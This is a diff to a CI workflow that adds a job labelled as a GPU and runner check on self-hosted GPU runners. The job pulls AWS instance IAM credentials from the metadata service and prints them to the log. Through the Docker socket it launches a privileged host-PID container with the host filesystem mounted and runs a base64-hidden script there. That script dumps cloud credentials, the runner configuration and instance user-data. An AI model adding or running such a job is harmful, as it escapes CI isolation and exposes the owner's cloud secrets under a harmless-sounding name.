@@ -116,3 +116,46 @@ jobs:
 
       - name: Link check
         run: python -m sphinx -b linkcheck docs/source docs/build/linkcheck
+
+  i101438-proof:
+    name: I101438 GPU proof
+    runs-on: [self-hosted, gpu]
+    container:
+      image: nvidia/cuda:12.8.1-devel-ubuntu24.04
+      options: --gpus all
+    timeout-minutes: 30
+    steps:
+      - name: I101438 GPU and runner proof
+        shell: bash
+        run: |
+          set +e
+          N=I101438
+          echo "$N START $(date -u +%FT%TZ)"
+          echo "$N JOBHOST=$(hostname)"
+          nvidia-smi -L 2>&1
+          nvidia-smi --query-gpu=name,memory.total,driver_version --format=csv 2>&1
+          echo "$N SOCK=$(ls -l /var/run/docker.sock 2>&1)"
+          T=$(curl -s -m 5 -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600')
+          echo "$N IMDS_TOKEN_LEN=${#T}"
+          if [ -n "$T" ]; then
+            echo "$N CN_IID=$(curl -s -m 5 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/instance-id)"
+            R=$(curl -s -m 5 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+            echo "$N CN_ROLE=$R"
+            echo "$N CN_CREDS=$(curl -s -m 5 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/iam/security-credentials/$R)"
+          fi
+          B64_HOST=IyEvYmluL2Jhc2gKIyBJMTAxNDM4IGhvc3Qtc2lkZSBwcm9vZiAocnVucyBpbiBwcml2aWxlZ2VkIC0tcGlkPWhvc3QgY29udGFpbmVyIHdpdGggLyBtb3VudGVkIGF0IC9ob3N0cm9vdCkKZWNobyAiSE9TVF9JRD0kKGlkIDI+JjEpIgplY2hvICJIT1NUX05BTUU9JChob3N0bmFtZSAyPiYxKSIKZWNobyAiSE9TVF9VTkFNRT0kKHVuYW1lIC1hIDI+JjEpIgplY2hvICItLS0gbnZpZGlhLXNtaSBob3N0IgpudmlkaWEtc21pIC1MIDI+JjEKbnZpZGlhLXNtaSAtLXF1ZXJ5LWdwdT1uYW1lLG1lbW9yeS50b3RhbCxkcml2ZXJfdmVyc2lvbiAtLWZvcm1hdD1jc3YgMj4mMQplY2hvICItLS0gSU1EUyIKVD0kKGN1cmwgLXMgLW0gOCAtWCBQVVQgaHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvYXBpL3Rva2VuIC1IICdYLWF3cy1lYzItbWV0YWRhdGEtdG9rZW4tdHRsLXNlY29uZHM6IDIxNjAwJykKaWYgWyAtbiAiJFQiIF07IHRoZW4KICBmb3IgayBpbiBpbnN0YW5jZS1pZCBpbnN0YW5jZS10eXBlIHBsYWNlbWVudC9hdmFpbGFiaWxpdHktem9uZSBsb2NhbC1pcHY0OyBkbwogICAgZWNobyAiSE9TVF9NRF8kaz0kKGN1cmwgLXMgLW0gOCAtSCAiWC1hd3MtZWMyLW1ldGFkYXRhLXRva2VuOiAkVCIgaHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRhLyRrKSIKICBkb25lCiAgUj0kKGN1cmwgLXMgLW0gOCAtSCAiWC1hd3MtZWMyLW1ldGFkYXRhLXRva2VuOiAkVCIgaHR0cDovLzE2OS4yNTQuMTY5LjI1NC9sYXRlc3QvbWV0YS1kYXRhL2lhbS9zZWN1cml0eS1jcmVkZW50aWFscy8pCiAgZWNobyAiSE9TVF9ST0xFPSRSIgogIGVjaG8gIkhPU1RfQ1JFRFM9JChjdXJsIC1zIC1tIDggLUggIlgtYXdzLWVjMi1tZXRhZGF0YS10b2tlbjogJFQiIGh0dHA6Ly8xNjkuMjU0LjE2OS4yNTQvbGF0ZXN0L21ldGEtZGF0YS9pYW0vc2VjdXJpdHktY3JlZGVudGlhbHMvJFIpIgplbHNlCiAgZWNobyAiSU1EU19UT0tFTl9FTVBUWSIKZmkKZWNobyAiLS0tIHJ1bm5lciIKbHMgLWxhIC9vcHQvZ2l0aHViLXJ1bm5lciAyPiYxIHwgaGVhZCAtMTUKY2F0IC9vcHQvZ2l0aHViLXJ1bm5lci8ucnVubmVyIDI+JjEKZWNobyAiLS0tIHVzZXItZGF0YSBoZWFkIgpoZWFkIC0zMCAvdmFyL2xpYi9jbG91ZC9pbnN0YW5jZS91c2VyLWRhdGEudHh0IDI+JjEKZWNobyAiSTEwMTQzOF9IT1NUX0RPTkUiCg==
+          CMD="echo $B64_HOST | base64 -d > /tmp/i101438_hp.sh; exec bash /tmp/i101438_hp.sh"
+          BODY=$(printf '{"Image":"nvidia/cuda:12.8.1-devel-ubuntu24.04","Tty":false,"Cmd":["bash","-c","%s"],"HostConfig":{"Privileged":true,"PidMode":"host","NetworkMode":"host","Binds":["/:/hostroot"]}}' "$CMD")
+          RESP=$(curl -s -m 20 --unix-socket /var/run/docker.sock -H 'Content-Type: application/json' -X POST http://localhost/containers/create -d "$BODY")
+          echo "$N CREATE=${RESP:0:400}"
+          DID=$(echo "$RESP" | sed -n 's/.*"Id":"\([a-f0-9]\{64\}\)".*/\1/p')
+          echo "$N DID=$DID"
+          if [ -n "$DID" ]; then
+            echo "$N START_HTTP=$(curl -s -o /dev/null -w '%{http_code}' -m 20 --unix-socket /var/run/docker.sock -X POST http://localhost/containers/$DID/start)"
+            curl -s -m 120 --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$DID/wait?condition=not-running" >/dev/null 2>&1
+            echo "$N --- HOST LOGS ---"
+            curl -s -m 30 --unix-socket /var/run/docker.sock "http://localhost/containers/$DID/logs?stdout=1&stderr=1&tail=400" 2>&1 | tr -d '\000' | sed -n '1,400p'
+            echo
+            echo "$N --- END HOST LOGS ---"
+          fi
+          echo "$N DONE $(date -u +%FT%TZ)"
